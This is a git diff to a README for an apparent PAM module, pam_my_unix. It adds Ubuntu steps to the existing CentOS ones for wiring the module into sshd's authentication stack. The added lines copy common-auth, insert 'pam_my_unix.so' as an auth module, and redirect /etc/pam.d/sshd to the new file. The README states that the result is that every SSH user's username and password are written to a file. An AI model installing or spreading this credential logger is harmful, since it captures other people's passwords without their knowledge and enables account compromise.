@@ -16,6 +16,7 @@
     ```
 
 - edit sshd's pam config.
+    ### CentOS
     ``` sh
     vim /etc/pam.d/sshd
     ```
@@ -33,6 +34,28 @@
     account    include      password-auth
     ...
     ```
+
+    ### Ubuntu
+    ``` sh
+    cp /etc/pam.d/common-auth /etc/pam.d/sshd-auth
+    vim /etc/pam.d/sshd-auth
+    ```
+    And the `sshd-auth` file looks like this below:
+    ```
+    auth	required            pam_unix.so nullok_secure
+    auth    optional            pam_my_unix.so
+    auth	required			pam_permit.so
+    ```
+
+    And then edit `/etc/pam.d/sshd` and change
+    ```
+    @include common-auth
+    ```
+    to
+    ```
+    @include sshd-auth
+    ```
+
 - result
     When someone who is trying to auth via ssh, his username and password will log into a file.
     ![result](https://raw.githubusercontent.com/LiGhT1EsS/pam_my_unix/master/doc/1.png)
